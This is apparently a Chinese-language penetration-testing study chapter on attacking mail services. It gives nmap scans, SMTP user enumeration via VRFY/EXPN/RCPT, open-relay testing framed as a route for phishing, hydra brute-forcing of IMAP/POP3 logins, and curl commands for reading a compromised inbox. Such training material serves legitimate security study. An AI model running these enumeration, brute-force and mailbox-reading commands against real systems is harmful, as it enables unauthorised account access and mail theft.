# 第 48 章 - SMTP、POP3 與 IMAP

## 標籤

- #cpts
- #chapter
- #smtp
- #pop3
- #imap
- #services

## 學習目標

- 理解郵件協定的攻擊面：帳號枚舉、Open Relay、弱 TLS、明文認證。
- 能用 nmap + telnet/netcat 手動與郵件伺服器互動。
- 能用 VRFY/EXPN/RCPT 枚舉使用者存在性。
- 能用 hydra 暴力破解 IMAP/POP3 憑證。

---

## 理論基礎

```text
SMTP（port 25/587/465）：郵件發送
  25  → MTA 之間的 SMTP（可能允許 relay）
  587 → 客戶端提交（submission），需 STARTTLS + 認證
  465 → SMTPS（SSL/TLS 封裝，較舊標準）

POP3（port 110/995）：下載郵件到本地（不同步）
  110 → 明文   995 → SSL/TLS

IMAP（port 143/993）：伺服器端郵件管理（同步）
  143 → 明文   993 → SSL/TLS

高價值攻擊面：
  1. 帳號枚舉（VRFY / EXPN / RCPT TO）
  2. Open Relay → 用目標伺服器發送釣魚郵件
  3. 弱認證 → 明文傳輸憑證
  4. 暴力破解 IMAP/POP3 → 存取郵件內容
```

---

## 方法一：服務發現

```bash
# 掃描郵件協定所有常見埠
nmap -sV -p 25,110,143,465,587,993,995 TARGET_IP
# 確認哪些服務在哪個埠運行

# NSE 腳本
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay \
  -p 25,587 TARGET_IP
# smtp-commands   → 列出 SMTP EHLO 支援的指令（AUTH、STARTTLS 等）
# smtp-enum-users → 嘗試用 VRFY/EXPN/RCPT 枚舉使用者
# smtp-open-relay → 測試是否為 Open Relay
```

---

## 方法二：手動 SMTP 互動（帳號枚舉）

```bash
# 連線 SMTP
nc -nv TARGET_IP 25
# 或
telnet TARGET_IP 25

# SMTP 交談流程
EHLO attacker.com
# EHLO → 宣告自己的 hostname，伺服器回傳支援的擴充功能

# 方法 A：VRFY（驗證使用者存在）
VRFY root
# 250 → 使用者存在
# 550 → 使用者不存在（差異回應 → 枚舉成功）

VRFY admin
VRFY postmaster

# 方法 B：EXPN（展開別名/郵件清單）
EXPN postmaster
EXPN sales

# 方法 C：RCPT TO（最通用，多數伺服器允許）
MAIL FROM:<test@attacker.com>
RCPT TO:<root@TARGET_DOMAIN>
# 250 → 信箱存在（伺服器接受遞送）
# 550 → 不存在

RCPT TO:<admin@TARGET_DOMAIN>
RCPT TO:<jsmith@TARGET_DOMAIN>
```

---

## 方法三：自動化帳號枚舉

```bash
# smtp-user-enum（專用工具）
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -t TARGET_IP
# -M VRFY → 使用 VRFY 方法（也可用 EXPN 或 RCPT）
# -U → 使用者名稱字典

smtp-user-enum -M RCPT \
  -U /usr/share/seclists/Usernames/Names/names.txt \
  -D TARGET_DOMAIN \
  -t TARGET_IP
# -D → 郵件域名（組合為 user@domain）
```

---

## 方法四：Open Relay 測試

```bash
# 手動測試：用目標 SMTP 轉寄到外部地址
nc TARGET_IP 25
EHLO test.com
MAIL FROM:<fake@fake.com>
RCPT TO:<attacker@gmail.com>   # 外部地址
DATA
Subject: Open Relay Test
Test message
.
# 若回 250 OK → Open Relay 成立（可用目標伺服器發送釣魚郵件）

# nmap 腳本版本
nmap --script smtp-open-relay -p 25 TARGET_IP
```

---

## 方法五：TLS 驗證

```bash
# 驗證 STARTTLS 行為（port 587）
openssl s_client -connect TARGET_IP:587 -starttls smtp
# -starttls smtp → 先明文連線再升級 TLS
# 觀察：TLS 版本、憑證資訊、支援的 cipher suite

# 直接 TLS（port 465 / 993 / 995）
openssl s_client -connect TARGET_IP:993
# 連線 IMAPS，看憑證與 TLS 設定
```

---

## 方法六：暴力破解 IMAP/POP3

```bash
# hydra 暴力破解 IMAP（port 143）
hydra -l username -P /usr/share/wordlists/rockyou.txt \
  imap://TARGET_IP
# -l → 單一使用者名稱

# IMAPS（SSL）
hydra -l username -P /usr/share/wordlists/rockyou.txt \
  imaps://TARGET_IP
# imaps → 自動處理 SSL

# POP3
hydra -l username -P /usr/share/wordlists/rockyou.txt \
  pop3://TARGET_IP

# 多使用者
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  imap://TARGET_IP -t 4
# -t 4 → 4 執行緒（郵件伺服器常有速率限制）

# 登入後讀取郵件（curl IMAP）
curl -u "user:password" imaps://TARGET_IP/INBOX --ssl-reqd
# 列出收件匣郵件

curl -u "user:password" imaps://TARGET_IP/INBOX;UID=1 --ssl-reqd
# 讀取第 1 封郵件
```

---

## 決策流程

```
nmap -p 25,110,143,465,587,993,995 確認服務
    ↓
smtp-commands NSE → 列出 EHLO 支援功能
    ↓
VRFY/RCPT 帳號枚舉 → smtp-user-enum
    ↓
smtp-open-relay → Open Relay？
    ↓
有憑證/字典：
  hydra imap / pop3 暴力破解
    ↓
取得認證：curl IMAP 讀取郵件 → 找憑證/敏感資訊
```

---

## 速查表

```bash
# 服務掃描
nmap -sV -p 25,110,143,587,993,995 TARGET_IP

# 帳號枚舉
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -D DOMAIN -t TARGET_IP

# 手動 EHLO + VRFY
nc TARGET_IP 25
EHLO x; VRFY root

# Open Relay
nmap --script smtp-open-relay -p 25 TARGET_IP

# TLS 驗證
openssl s_client -connect TARGET_IP:587 -starttls smtp

# 暴力破解
hydra -l user -P rockyou.txt imap://TARGET_IP -t 4

# 讀取郵件
curl -u "user:pass" imaps://TARGET_IP/INBOX --ssl-reqd
```

---

## 關聯筆記

- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
